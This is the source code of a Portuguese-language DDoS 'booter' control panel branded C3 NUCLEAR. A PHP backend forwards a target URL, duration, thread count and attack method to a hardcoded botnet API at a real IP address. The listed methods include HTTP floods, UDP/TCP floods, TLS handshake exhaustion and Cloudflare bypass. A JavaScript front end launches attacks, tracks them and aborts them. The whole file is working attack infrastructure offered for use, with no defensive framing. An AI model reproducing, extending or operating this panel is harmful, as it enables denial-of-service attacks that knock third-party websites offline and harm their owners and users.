<?php
// painel.php - C3 NUCLEAR - PAINEL PREMIUM V3
$API_BASE = 'http://154.64.32.239:8080';
$MEU_IP = '154.64.32.239';

// Pega o IP do cliente (se estiver em localhost, pega o próprio IP do servidor)
$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? $MEU_IP;
if ($user_ip == '127.0.0.1' || $user_ip == '::1') {
    $user_ip = $MEU_IP;
}

// Define os limites
if ($user_ip === $MEU_IP) {
    $MAX_THREADS = 2000;
    $MAX_TIME = 9999999;
} else {
    $MAX_THREADS = 10;
    $MAX_TIME = 200;
}

// Função robusta para chamar a API
function chamar_api($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) C3-Nuclear-Panel');
    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($resp === false || $code >= 500) {
        // Fallback
        $ctx = stream_context_create(['http' => ['timeout' => 5, 'ignore_errors' => true]]);
        $resp = @file_get_contents($url, false, $ctx);
    }
    
    if (!$resp) return false;
    $json = json_decode($resp, true);
    return $json;
}

// ---------------------------------------------------------
// AJAX
// ---------------------------------------------------------
if (isset($_GET['ajax'])) {
    header('Content-Type: application/json; charset=utf-8');
    $acao = $_GET['ajax'];

    if ($acao === 'metados') {
        $res = chamar_api($API_BASE . '/metado');
        if ($res === false) {
            echo json_encode(['status' => false, 'error' => 'API Offline ou inacessível']);
        } else {
            echo json_encode($res);
        }
        exit;
    }

    if ($acao === 'iniciar') {
        $alvo = trim($_POST['alvo'] ?? '');
        $time = (int)($_POST['time'] ?? 0);
        $threads = (int)($_POST['threads'] ?? 0);
        $metado = trim($_POST['metado'] ?? '');

        // Validações
        if (!$alvo || !$time || !$threads || !$metado) {
            echo json_encode(['status' => false, 'error' => 'Preencha todos os campos.']); exit;
        }
        if (strpos($alvo, 'http://') !== 0 && strpos($alvo, 'https://') !== 0) {
            echo json_encode(['status' => false, 'error' => 'URL inválida. Use http:// ou https://']); exit;
        }
        if ($time < 1 || $time > $MAX_TIME) {
            echo json_encode(['status' => false, 'error' => "Time inválido. Limite: 1 a $MAX_TIME"]); exit;
        }
        if ($threads < 1 || $threads > $MAX_THREADS) {
            echo json_encode(['status' => false, 'error' => "Threads inválido. Limite: 1 a $MAX_THREADS"]); exit;
        }

        // --- PROTEÇÃO DE IP ---
        $lock_file = sys_get_temp_dir() . '/c3_lock_' . md5($user_ip) . '.txt';
        if (file_exists($lock_file)) {
            $end_time = (int)file_get_contents($lock_file);
            if (time() < $end_time) {
                $restam = $end_time - time();
                echo json_encode(['status' => false, 'error' => "Você já tem uma inundação ativa. Aguarde {$restam}s."]);
                exit;
            } else {
                unlink($lock_file);
            }
        }

        // Chama a API
        $urlApi = $API_BASE . '/botnetc3api/?alvo=' . rawurlencode($alvo) . '&time=' . $time . '&threads=' . $threads . '&metado=' . rawurlencode($metado);
        $res = chamar_api($urlApi);

        if ($res && isset($res['status']) && $res['status'] === true) {
            // Salva lock do IP
            file_put_contents($lock_file, time() + $time);
            echo json_encode(['status' => true, 'id' => $res['id']]);
        } else {
            echo json_encode(['status' => false, 'error' => $res['error'] ?? 'Erro desconhecido na API']);
        }
        exit;
    }
    
    if ($acao === 'stop') {
        $id = trim($_POST['id'] ?? '');
        if ($id) {
            chamar_api($API_BASE . '/botnetc3api/?stop=' . rawurlencode($id));
            // Libera o IP ao abortar
            $lock_file = sys_get_temp_dir() . '/c3_lock_' . md5($user_ip) . '.txt';
            if (file_exists($lock_file)) unlink($lock_file);
            echo json_encode(['status' => true]);
        }
        exit;
    }

    exit;
}

$descricoes = [
    'KILL' => 'Ataque multi-camada devastador que sobrecarrega todos os recursos do servidor.',
    'GPZ-AR' => 'Requisições HTTP GET/POST massivas explorando vulnerabilidades Layer 7.',
    'WX' => 'Flood UDP/TCP bruto na camada 4, saturando toda a largura de banda.',
    'TLS' => 'Sobrecarga no handshake SSL/TLS forçando reinicialização de conexões.',
    'TLS1' => 'Handshake alternativo mais agressivo com bypass de mitigação.',
    'HTTP' => 'Flood HTTP puro com altíssima taxa de requisições HEAD/GET.',
    'FLOODER' => 'Flood genérico de pacotes com taxa elevada de RPS.',
    'C3' => 'Híbrido C3 combinando conexões persistentes e requisições leves.',
    'CLOUD' => 'Bypass de proteções Cloudflare usando User-Agents e IPs rotativos.'
];
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>C3 NUCLEAR</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
    :root {
        --bg: #05080f;
        --card: rgba(15, 23, 42, 0.7);
        --border: rgba(51, 65, 85, 0.6);
        --primary: #3b82f6;
        --primary-glow: rgba(59, 130, 246, 0.4);
        --text: #f8fafc;
        --muted: #94a3b8;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
    body {
        background-color: var(--bg);
        background-image: radial-gradient(circle at 50% 0%, rgba(59,130,246,0.15) 0%, transparent 60%);
        color: var(--text);
        min-height: 100vh;
        padding-bottom: 60px;
    }
    
    /* HEADER */
    .header {
        background: rgba(5, 8, 15, 0.8);
        backdrop-filter: blur(16px);
        -webkit-backdrop-filter: blur(16px);
        border-bottom: 1px solid var(--border);
        padding: 16px 20px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        position: sticky;
        top: 0;
        z-index: 100;
    }
    .logo-area { display: flex; align-items: center; gap: 12px; }
    .logo-icon {
        width: 42px; height: 42px;
        background: linear-gradient(135deg, #3b82f6, #1e3a8a);
        border-radius: 12px;
        display: flex; justify-content: center; align-items: center;
        font-size: 22px;
        box-shadow: 0 0 20px var(--primary-glow);
    }
    .logo-text h1 { font-size: 20px; font-weight: 800; letter-spacing: 0.5px; }
    .logo-text h1 span { color: var(--primary); }
    .logo-text p { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 1.5px; margin-top: 2px; }
    
    .status-badge {
        background: rgba(34, 197, 94, 0.1);
        border: 1px solid rgba(34, 197, 94, 0.3);
        color: #4ade80;
        padding: 6px 12px;
        border-radius: 20px;
        font-size: 11px;
        font-weight: 700;
        display: flex; align-items: center; gap: 6px;
    }
    .status-dot { width: 6px; height: 6px; background: #4ade80; border-radius: 50%; box-shadow: 0 0 10px #4ade80; animation: pulse 2s infinite; }
    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }

    /* CONTAINER */
    .container { max-width: 780px; margin: 24px auto; padding: 0 16px; }
    
    .card {
        background: var(--card);
        backdrop-filter: blur(12px);
        border: 1px solid var(--border);
        border-radius: 20px;
        padding: 22px;
        margin-bottom: 20px;
        box-shadow: 0 10px 40px rgba(0,0,0,0.3);
    }
    
    .card-header {
        display: flex; align-items: center; gap: 10px;
        margin-bottom: 20px;
        padding-bottom: 14px;
        border-bottom: 1px solid rgba(255,255,255,0.05);
    }
    .card-header h2 { font-size: 15px; font-weight: 700; color: #fff; letter-spacing: 0.5px; }

    /* FORMULÁRIO */
    .field { margin-bottom: 16px; }
    .field label {
        display: block; font-size: 11px; font-weight: 700;
        color: var(--muted); text-transform: uppercase;
        letter-spacing: 1px; margin-bottom: 8px;
    }
    .input-wrap { position: relative; display: flex; align-items: center; }
    .input-wrap input, .input-wrap select {
        width: 100%; background: rgba(0,0,0,0.3);
        border: 1px solid var(--border); color: #fff;
        padding: 14px 16px; border-radius: 12px;
        font-size: 14px; outline: none; transition: 0.3s;
    }
    .input-wrap input:focus, .input-wrap select:focus {
        border-color: var(--primary);
        box-shadow: 0 0 0 3px var(--primary-glow);
    }
    .input-wrap select { appearance: none; cursor: pointer; }
    .input-wrap .arrow { position: absolute; right: 16px; color: var(--muted); font-size: 10px; pointer-events: none; }

    /* SLIDER */
    .slider-wrap {
        display: flex; align-items: center; gap: 16px;
        background: rgba(0,0,0,0.3); border: 1px solid var(--border);
        border-radius: 12px; padding: 16px;
    }
    .slider-wrap input[type=range] {
        flex: 1; -webkit-appearance: none; height: 6px;
        background: rgba(255,255,255,0.1); border-radius: 3px;
        outline: none;
    }
    .slider-wrap input[type=range]::-webkit-slider-thumb {
        -webkit-appearance: none; width: 22px; height: 22px;
        background: var(--primary); border: 4px solid #05080f;
        border-radius: 50%; cursor: pointer;
        box-shadow: 0 0 15px var(--primary-glow); transition: 0.1s;
    }
    .slider-wrap input[type=range]::-webkit-slider-thumb:hover { transform: scale(1.1); }
    .slider-value {
        background: rgba(59, 130, 246, 0.1); color: var(--primary);
        padding: 6px 12px; border-radius: 8px;
        font-family: 'JetBrains Mono', monospace;
        font-weight: 700; font-size: 15px;
        min-width: 60px; text-align: center;
        border: 1px solid rgba(59, 130, 246, 0.2);
    }

    /* BOTÃO */
    .btn-main {
        width: 100%; padding: 16px; background: var(--primary);
        color: #fff; border: none; border-radius: 12px;
        font-size: 15px; font-weight: 800; text-transform: uppercase;
        letter-spacing: 1px; cursor: pointer; transition: 0.2s;
        display: flex; justify-content: center; align-items: center; gap: 8px;
        margin-top: 10px; box-shadow: 0 4px 20px var(--primary-glow);
    }
    .btn-main:hover { background: #2563eb; transform: translateY(-2px); box-shadow: 0 6px 25px var(--primary-glow); }
    .btn-main:disabled { background: #1e3a8a; opacity: 0.7; cursor: not-allowed; transform: none; box-shadow: none; }

    /* ALERTAS */
    .msg { padding: 14px 16px; border-radius: 10px; font-size: 13px; font-weight: 500; margin-top: 16px; display: none; }
    .msg.show { display: block; animation: fadeIn 0.3s ease; }
    .msg-err { background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); color: #fca5a5; }
    .msg-ok { background: rgba(34, 197, 94, 0.1); border: 1px solid rgba(34, 197, 94, 0.3); color: #86efac; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }

    /* ATAQUES */
    .ataque-item {
        background: rgba(0,0,0,0.2); border: 1px solid var(--border);
        border-radius: 14px; padding: 18px; margin-bottom: 16px;
        position: relative; overflow: hidden;
    }
    .ataque-item.queda { border-color: rgba(239, 68, 68, 0.5); }
    .ataque-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 16px; }
    .ataque-alvo { font-size: 14px; font-weight: 700; color: #fff; word-break: break-all; max-width: 70%; }
    .ataque-id { font-size: 11px; color: var(--muted); background: rgba(255,255,255,0.05); padding: 4px 8px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; }
    
    .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 16px; }
    .stat { background: rgba(255,255,255,0.03); padding: 10px; border-radius: 10px; }
    .stat .k { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; font-weight: 600; }
    .stat .v { font-size: 14px; font-weight: 700; color: #fff; }
    .v-on { color: #4ade80 !important; text-shadow: 0 0 10px rgba(74,222,128,0.3); }
    .v-off { color: #f87171 !important; text-shadow: 0 0 10px rgba(248,113,113,0.3); }

    .progress-wrap { margin-bottom: 16px; }
    .progress-bar { height: 8px; background: rgba(255,255,255,0.05); border-radius: 4px; overflow: hidden; }
    .progress-fill { height: 100%; background: var(--primary); width: 0%; transition: width 1s linear; box-shadow: 0 0 10px var(--primary-glow); }
    .progress-fill.queda { background: #ef4444; box-shadow: 0 0 10px rgba(239,68,68,0.5); }
    .progress-text { display: flex; justify-content: space-between; font-size: 11px; color: var(--muted); margin-top: 8px; font-family: 'JetBrains Mono', monospace; }

    .btn-abortar {
        width: 100%; padding: 12px; background: rgba(239, 68, 68, 0.1);
        color: #f87171; border: 1px solid rgba(239, 68, 68, 0.2);
        border-radius: 10px; font-size: 12px; font-weight: 700;
        text-transform: uppercase; cursor: pointer; transition: 0.2s;
    }
    .btn-abortar:hover { background: rgba(239, 68, 68, 0.2); }

    .vazio { text-align: center; padding: 40px 0; color: var(--muted); font-size: 14px; }
    .vazio span { display: block; font-size: 32px; margin-bottom: 10px; opacity: 0.5; }
</style>
</head>
<body>

<div class="header">
    <div class="logo-area">
        <div class="logo-icon">☢️</div>
        <div class="logo-text">
            <h1>C3 <span>NUCLEAR</span></h1>
            <p>Advanced Control Panel</p>
        </div>
    </div>
    <div class="status-badge">
        <div class="status-dot"></div> API ONLINE
    </div>
</div>

<div class="container">
    <div class="card">
        <div class="card-header">
            <span>🚀</span>
            <h2>INICIAR OFENSIVA</h2>
        </div>
        
        <form id="formAtaque">
            <div class="field">
                <label>Alvo (URL)</label>
                <div class="input-wrap">
                    <input type="text" id="alvo" placeholder="https://exemplo.com/" required>
                </div>
            </div>

            <div class="field">
                <label>Time (segundos) <span style="color:var(--muted);font-size:10px">(Max: <?= $MAX_TIME ?>)</span></label>
                <div class="input-wrap">
                    <input type="number" id="time" placeholder="Ex: 120" min="1" max="<?= $MAX_TIME ?>" required>
                </div>
            </div>

            <div class="field">
                <label>Método de Ataque</label>
                <div class="input-wrap">
                    <select id="metado" required>
                        <option value="">Carregando métodos...</option>
                    </select>
                    <span class="arrow">▼</span>
                </div>
            </div>

            <div class="field">
                <label>Threads <span style="color:var(--muted);font-size:10px">(Max: <?= $MAX_THREADS ?>)</span></label>
                <div class="slider-wrap">
                    <input type="range" id="threads" min="1" max="<?= $MAX_THREADS ?>" value="1">
                    <div class="slider-value" id="threadsVal">1</div>
                </div>
            </div>

            <button type="submit" class="btn-main" id="btnIniciar">⚡ Iniciar Ataque</button>
            <div class="msg" id="msgForm"></div>
        </form>
    </div>

    <div class="card">
        <div class="card-header">
            <span>🎯</span>
            <h2>ATAQUES EM ANDAMENTO</h2>
        </div>
        <div id="ataquesLista">
            <div class="vazio" id="vazioMsg">
                <span>🎯</span>
                Nenhum ataque ativo no momento.
            </div>
        </div>
    </div>
</div>

<script>
const API_BASE = 'painel.php';
let ataques = {};

// Atualiza o valor visual do Slider
const slider = document.getElementById('threads');
const sliderVal = document.getElementById('threadsVal');
slider.addEventListener('input', () => { sliderVal.textContent = slider.value; });

// Carrega Métodos
async function carregarMetados() {
    try {
        const r = await fetch(API_BASE + '?ajax=metados');
        const j = await r.json();
        const sel = document.getElementById('metado');
        
        if (j.metados && j.metados.length > 0) {
            sel.innerHTML = '<option value="">Selecione um método...</option>';
            j.metados.forEach(m => {
                const opt = document.createElement('option');
                opt.value = m; opt.textContent = m;
                sel.appendChild(opt);
            });
        } else {
            sel.innerHTML = '<option value="">API não retornou métodos</option>';
        }
    } catch(e) {
        document.getElementById('metado').innerHTML = '<option value="">Falha ao conectar na API</option>';
    }
}

function mostrarMsg(tipo, texto) {
    const m = document.getElementById('msgForm');
    m.className = 'msg show ' + (tipo === 'ok' ? 'msg-ok' : 'msg-err');
    m.textContent = texto;
    if (tipo === 'ok') setTimeout(() => m.classList.remove('show'), 5000);
}

// Iniciar
document.getElementById('formAtaque').addEventListener('submit', async (e) => {
    e.preventDefault();
    const alvo = document.getElementById('alvo').value.trim();
    const time = document.getElementById('time').value.trim();
    const threads = slider.value;
    const metado = document.getElementById('metado').value;

    if (!alvo.startsWith('http://') && !alvo.startsWith('https://')) {
        mostrarMsg('err', '⚠️ URL inválida. Use https:// ou http://'); return;
    }
    if (!alvo || !time || !metado) {
        mostrarMsg('err', 'Preencha todos os campos.'); return;
    }

    // Se já tem um ataque ativo no front-end (por segurança)
    if (Object.keys(ataques).length > 0) {
        mostrarMsg('err', 'Você já tem uma inundação ativa. Aguarde...'); return;
    }

    const btn = document.getElementById('btnIniciar');
    btn.disabled = true; btn.innerHTML = '⏳ Iniciando...';

    try {
        const fd = new FormData();
        fd.append('alvo', alvo); fd.append('time', time);
        fd.append('threads', threads); fd.append('metado', metado);
        
        const r = await fetch(API_BASE + '?ajax=iniciar', { method: 'POST', body: fd });
        const j = await r.json();

        if (j.status === true && j.id) {
            mostrarMsg('ok', '✅ Ataque iniciado com sucesso!');
            ataques[j.id] = {
                id: j.id, alvo: alvo, time: parseInt(time),
                threads: parseInt(threads), metado: metado, startTime: Date.now()
            };
            salvarAtaques(); renderizar();
        } else {
            mostrarMsg('err', '❌ ' + (j.error || 'Erro desconhecido'));
        }
    } catch(err) {
        mostrarMsg('err', '❌ Erro de conexão com o servidor.');
    } finally {
        btn.disabled = false; btn.innerHTML = '⚡ Iniciar Ataque';
    }
});

// Persistência
function salvarAtaques() { localStorage.setItem('c3_ataques_v3', JSON.stringify(ataques)); }
function carregarSalvos() {
    try {
        const s = localStorage.getItem('c3_ataques_v3');
        if (s) {
            const obj = JSON.parse(s);
            const agora = Date.now();
            for (const id in obj) {
                if ((agora - obj[id].startTime) / 1000 < obj[id].time) ataques[id] = obj[id];
            }
        }
    } catch(e) {}
}

function renderizar() {
    const lista = document.getElementById('ataquesLista');
    const ids = Object.keys(ataques);
    if (ids.length === 0) {
        lista.innerHTML = '<div class="vazio" id="vazioMsg"><span>🎯</span>Nenhum ataque ativo no momento.</div>'; return;
    }
    if (document.getElementById('vazioMsg')) document.getElementById('vazioMsg').remove();

    ids.forEach(id => {
        if (document.querySelector(`.ataque-item[data-id="${id}"]`)) return;
        const a = ataques[id];
        const el = document.createElement('div');
        el.className = 'ataque-item'; el.dataset.id = id;
        el.innerHTML = `
            <div class="ataque-top">
                <div class="ataque-alvo">${esc(a.alvo)}</div>
                <div class="ataque-id">ID: ${id}</div>
            </div>
            <div class="stats-grid">
                <div class="stat"><div class="k">Método</div><div class="v">${esc(a.metado)}</div></div>
                <div class="stat"><div class="k">Time</div><div class="v">${a.time}s</div></div>
                <div class="stat"><div class="k">Threads</div><div class="v">${a.threads}</div></div>
                <div class="stat"><div class="k">Status</div><div class="v" data-status>...</div></div>
            </div>
            <div class="progress-wrap">
                <div class="progress-bar"><div class="progress-fill" style="width:0%"></div></div>
                <div class="progress-text">
                    <span class="tempo-restante">Restam: ${a.time}s</span>
                    <span>0%</span>
                </div>
            </div>
            <button class="btn-abortar" onclick="abortar('${id}')">Abortar Ataque</button>
        `;
        lista.appendChild(el);
    });
}

function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }

// Loop de atualização
setInterval(async () => {
    const agora = Date.now();
    const items = document.querySelectorAll('.ataque-item');
    for (const el of items) {
        const id = el.dataset.id;
        const a = ataques[id];
        if (!a) { el.remove(); continue; }

        const decorrido = Math.floor((agora - a.startTime) / 1000);
        const restante = a.time - decorrido;
        const pct = Math.min(100, Math.max(0, (decorrido / a.time) * 100));

        const fill = el.querySelector('.progress-fill');
        if (fill) fill.style.width = pct.toFixed(1) + '%';
        
        const txt = el.querySelector('.progress-text span:last-child');
        if (txt) txt.textContent = pct.toFixed(0) + '%';
        const tr = el.querySelector('.tempo-restante');
        if (tr) tr.textContent = restante <= 0 ? 'Finalizando...' : 'Restam: ' + restante + 's';

        if (restante <= 0) {
            delete ataques[id]; salvarAtaques(); el.remove(); continue;
        }
    }
    if (Object.keys(ataques).length === 0 && !document.getElementById('vazioMsg')) {
        document.getElementById('ataquesLista').innerHTML = '<div class="vazio" id="vazioMsg"><span>🎯</span>Nenhum ataque ativo no momento.</div>';
    }
}, 1000);

async function abortar(id) {
    if (!confirm('Abortar o ataque ' + id + '?')) return;
    try {
        const fd = new FormData(); fd.append('id', id);
        await fetch(API_BASE + '?ajax=stop', { method: 'POST', body: fd });
        delete ataques[id]; salvarAtaques();
        const el = document.querySelector(`.ataque-item[data-id="${id}"]`);
        if (el) el.remove();
    } catch(e) { alert('Erro de conexão'); }
}

carregarMetados(); carregarSalvos(); renderizar();
</script>
</body>
</html>